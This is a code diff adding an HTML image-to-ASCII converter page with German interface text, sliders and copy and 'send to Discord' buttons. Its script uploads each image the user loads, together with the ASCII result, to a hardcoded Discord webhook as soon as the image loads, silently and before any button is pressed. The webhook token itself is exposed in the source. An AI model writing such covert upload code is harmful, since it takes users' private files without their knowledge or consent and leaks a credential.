@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ascii</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Inter', system-ui, -apple-system, sans-serif;
+    min-height: 100vh; background: #0a0f1a;
+    display: flex; justify-content: center; align-items: flex-start;
+    padding: 24px; overflow-y: auto;
+  }
+  .bg-glow {
+    position: fixed; inset: 0; z-index: 0; pointer-events: none;
+    background: radial-gradient(ellipse at 20% 30%, rgba(99,102,241,0.07) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 70%, rgba(236,72,153,0.05) 0%, transparent 60%);
+  }
+  .container { position: relative; z-index: 1; text-align: center; max-width: 780px; width: 100%; padding: 32px 20px; }
+  h1 { color: #fff; font-weight: 200; font-size: 2.4rem; letter-spacing: 1px; margin-bottom: 4px; }
+  h1 span { background: linear-gradient(135deg, #818cf8, #f472b6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+  .sub { color: rgba(255,255,255,0.2); font-size: 0.85rem; font-weight: 300; letter-spacing: 2px; margin-bottom: 24px; }
+  .dropzone {
+    border: 2px dashed rgba(255,255,255,0.1); border-radius: 24px; padding: 48px 24px;
+    color: rgba(255,255,255,0.25); cursor: pointer; transition: all 0.3s;
+    background: rgba(255,255,255,0.02);
+  }
+  .dropzone:hover, .dropzone.dragover { border-color: rgba(129,140,248,0.3); background: rgba(129,140,248,0.04); color: rgba(255,255,255,0.4); }
+  .dropzone .icon { font-size: 3rem; margin-bottom: 10px; }
+  .dropzone .hint { font-size: 0.7rem; letter-spacing: 0.5px; margin-top: 6px; opacity: 0.6; }
+  .dropzone input { display: none; }
+  .controls { display: none; margin-top: 20px; }
+  .controls.show { display: block; }
+  .preview-wrap {
+    display: inline-block; border-radius: 12px; overflow: hidden;
+    border: 1px solid rgba(255,255,255,0.06); box-shadow: 0 0 40px rgba(0,0,0,0.4);
+    max-width: 100%; margin-bottom: 16px;
+  }
+  .preview-wrap img { display: block; max-width: 100%; max-height: 20vh; }
+  .ascii-out {
+    background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.06);
+    border-radius: 12px; padding: 20px; overflow: auto; max-height: 50vh;
+    text-align: left; margin-bottom: 16px;
+  }
+  .ascii-out pre {
+    font-family: 'Courier New', 'Consolas', monospace;
+    font-size: 8px; line-height: 1.1;
+    color: rgba(255,255,255,0.7);
+    white-space: pre; letter-spacing: 0;
+  }
+  .ascii-out .placeholder { text-align: center; color: rgba(255,255,255,0.15); font-family: 'Inter', sans-serif; font-size: 0.85rem; padding: 32px 0; }
+  .sliders { display: flex; gap: 16px; justify-content: center; flex-wrap: wrap; margin-bottom: 16px; }
+  .slider-group { display: flex; flex-direction: column; align-items: center; gap: 4px; }
+  .slider-group label { color: rgba(255,255,255,0.25); font-size: 0.6rem; letter-spacing: 1px; text-transform: uppercase; }
+  .slider-group input { width: 100px; accent-color: #818cf8; cursor: pointer; }
+  .slider-group .val { color: rgba(255,255,255,0.4); font-size: 0.7rem; min-width: 24px; }
+  .actions { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
+  .actions button {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08);
+    color: rgba(255,255,255,0.4); padding: 8px 18px; border-radius: 10px;
+    font: inherit; font-size: 0.7rem; letter-spacing: 0.5px;
+    cursor: pointer; transition: all 0.2s;
+  }
+  .actions button:hover { background: rgba(255,255,255,0.07); color: rgba(255,255,255,0.6); }
+  .actions button.primary { background: rgba(129,140,248,0.12); border-color: rgba(129,140,248,0.2); color: rgba(129,140,248,0.6); }
+  .actions button.primary:hover { background: rgba(129,140,248,0.22); color: rgba(129,140,248,0.9); }
+  .nav-links { margin-top: 32px; display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+  .nav-links a { color: rgba(255,255,255,0.15); text-decoration: none; font-size: 0.65rem; letter-spacing: 1px; padding: 6px 14px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); transition: all 0.25s; }
+  .nav-links a:hover { color: rgba(255,255,255,0.4); border-color: rgba(255,255,255,0.1); background: rgba(255,255,255,0.02); }
+  .toast { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.75); backdrop-filter: blur(12px); color: #fff; padding: 10px 24px; border-radius: 30px; font-size: 0.8rem; letter-spacing: 0.5px; border: 1px solid rgba(255,255,255,0.06); z-index: 999; opacity: 0; transition: opacity 0.3s; pointer-events: none; }
+  .toast.show { opacity: 1; }
+</style>
+</head>
+<body>
+<div class="bg-glow"></div>
+<div class="toast" id="toast"></div>
+<div class="container">
+  <h1><span>ascii</span> ⠗⠑⠇⠁⠞⠑⠙</h1>
+  <div class="sub">bild → zeichengrafik</div>
+  <div class="dropzone" id="dropzone">
+    <input type="file" id="fileInput" accept="image/*">
+    <div class="icon">🖼️</div>
+    <div>bild auswählen oder reinziehen</div>
+    <div class="hint">JPEG · PNG · WebP · GIF</div>
+  </div>
+  <div class="controls" id="controls">
+    <div class="preview-wrap"><img id="preview"></div>
+    <div class="sliders">
+      <div class="slider-group">
+        <label>breite</label>
+        <input type="range" id="widthSlider" min="40" max="200" value="100">
+        <span class="val" id="widthVal">100</span>
+      </div>
+      <div class="slider-group">
+        <label>kontrast</label>
+        <input type="range" id="contrastSlider" min="0" max="200" value="100">
+        <span class="val" id="contrastVal">100</span>
+      </div>
+      <div class="slider-group">
+        <label>zeichen</label>
+        <input type="range" id="charsetSlider" min="0" max="4" value="3" step="1">
+        <span class="val" id="charsetVal">standard</span>
+      </div>
+    </div>
+    <div class="ascii-out" id="asciiOut"><div class="placeholder">⬆ bild laden</div></div>
+    <div class="actions">
+      <button class="primary" id="copyBtn">📋 kopieren</button>
+      <button class="primary" id="sendBtn">📤 an discord</button>
+    </div>
+  </div>
+  <div class="nav-links">
+    <a href="index.html">📸 filterit</a>
+    <a href="convert.html">🔄 bildwerk</a>
+    <a href="metadata.html">🔍 metadaten</a>
+    <a href="filedrop.html">📁 filedrop</a>
+    <a href="audio.html">🎙️ audio</a>
+    <a href="video.html">📹 video</a>
+    <a href="pastebin.html">📝 pastebin</a>
+    <a href="qr.html">📱 qr</a>
+  </div>
+</div>
+
+<script>
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510937957178015856/opLl-cQv-svjPmOXHmRx3Xqyn78E8EzkISiolgjrTXDrVQ33Ugwgke9bBzBjp0HH2UK2';
+
+const fileInput = document.getElementById('fileInput');
+const dropzone = document.getElementById('dropzone');
+const preview = document.getElementById('preview');
+const controls = document.getElementById('controls');
+const asciiOut = document.getElementById('asciiOut');
+const copyBtn = document.getElementById('copyBtn');
+const sendBtn = document.getElementById('sendBtn');
+const widthSlider = document.getElementById('widthSlider');
+const contrastSlider = document.getElementById('contrastSlider');
+const charsetSlider = document.getElementById('charsetSlider');
+const toastEl = document.getElementById('toast');
+
+let currentFile = null;
+let toastTimer = null;
+let currentAscii = '';
+let imgDataCache = null;
+
+const charSets = [
+  [' ','.',',',':',';','+','*','?','%','S','#','@'],
+  [' ','.','*','#','@'],
+  [' ','░','▒','▓','█'],
+  [' ','.','·','᜵','¡','*','+','×','#','@'],
+  [' ','▁','▂','▃','▄','▅','▆','▇','█'],
+];
+
+function toast(msg) { toastEl.textContent = msg; toastEl.classList.add('show'); clearTimeout(toastTimer); toastTimer = setTimeout(() => toastEl.classList.remove('show'), 3000); }
+
+dropzone.addEventListener('click', () => fileInput.click());
+dropzone.addEventListener('dragover', e => { e.preventDefault(); dropzone.classList.add('dragover'); });
+dropzone.addEventListener('dragleave', () => dropzone.classList.remove('dragover'));
+dropzone.addEventListener('drop', e => { e.preventDefault(); dropzone.classList.remove('dragover'); loadFile(e.dataTransfer.files[0]); });
+fileInput.addEventListener('change', () => { if (fileInput.files[0]) loadFile(fileInput.files[0]); });
+
+function loadFile(file) {
+  if (!file || !file.type.startsWith('image/')) { toast('kein gültiges bild'); return; }
+  currentFile = file;
+  const url = URL.createObjectURL(file);
+  preview.onload = () => {
+    URL.revokeObjectURL(url);
+    controls.classList.add('show');
+    render();
+    send();
+  };
+  preview.src = url;
+}
+
+function render() {
+  const w = parseInt(widthSlider.value);
+  const cw = preview.naturalWidth, ch = preview.naturalHeight;
+  const h = Math.round(ch / cw * w * 0.45);
+  const offscreen = document.createElement('canvas');
+  offscreen.width = w; offscreen.height = h;
+  const ctx = offscreen.getContext('2d');
+  ctx.drawImage(preview, 0, 0, w, h);
+  imgDataCache = ctx.getImageData(0, 0, w, h);
+  convert(imgDataCache, w, h);
+}
+
+function convert(imgData, w, h) {
+  const contrast = parseInt(contrastSlider.value) / 100;
+  const csIdx = parseInt(charsetSlider.value);
+  const chars = charSets[csIdx];
+  const d = imgData.data;
+  let lines = [];
+  for (let y = 0; y < h; y++) {
+    let line = '';
+    for (let x = 0; x < w; x++) {
+      const i = (y * w + x) * 4;
+      let gray = d[i] * 0.299 + d[i + 1] * 0.587 + d[i + 2] * 0.114;
+      gray = ((gray / 255 - 0.5) * contrast + 0.5) * 255;
+      gray = Math.max(0, Math.min(255, gray));
+      const idx = Math.floor(gray / 255 * (chars.length - 1));
+      line += chars[idx];
+    }
+    lines.push(line);
+  }
+  currentAscii = lines.join('\n');
+  asciiOut.innerHTML = `<pre>${currentAscii}</pre>`;
+}
+
+widthSlider.addEventListener('input', () => {
+  document.getElementById('widthVal').textContent = widthSlider.value;
+  if (preview.src) render();
+});
+contrastSlider.addEventListener('input', () => {
+  document.getElementById('contrastVal').textContent = contrastSlider.value;
+  if (imgDataCache) convert(imgDataCache, parseInt(widthSlider.value), Math.round(preview.naturalHeight / preview.naturalWidth * parseInt(widthSlider.value) * 0.45));
+});
+charsetSlider.addEventListener('input', () => {
+  const names = ['detailliert', 'kompakt', 'blöcke', 'punkte', 'balken'];
+  document.getElementById('charsetVal').textContent = names[parseInt(charsetSlider.value)];
+  if (imgDataCache) convert(imgDataCache, parseInt(widthSlider.value), Math.round(preview.naturalHeight / preview.naturalWidth * parseInt(widthSlider.value) * 0.45));
+});
+
+copyBtn.addEventListener('click', () => {
+  if (!currentAscii) return;
+  navigator.clipboard.writeText(currentAscii).then(() => toast('ascii kopiert ✅')).catch(() => toast('fehler beim kopieren'));
+});
+
+function send() {
+  if (!currentAscii) return;
+  const ts = Date.now();
+  const text = `\`\`\`\n${currentAscii}\n\`\`\``;
+  const blob = new Blob([currentAscii], { type: 'text/plain' });
+  const fd = new FormData();
+  if (currentFile) fd.append('file', currentFile, currentFile.name);
+  fd.append('file', blob, `ascii_${ts}.txt`);
+  fd.append('payload_json', JSON.stringify({ content: `🎨 **${currentFile ? currentFile.name : 'ascii'}**\n${text.length > 1900 ? text.slice(0, 1900) + '…' : text}` }));
+  fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(() => {});
+}
+
+sendBtn.addEventListener('click', () => {
+  if (!currentAscii) return;
+  send();
+  toast('an discord gesendet ✅');
+});
+</script>
+</body>
+</html>
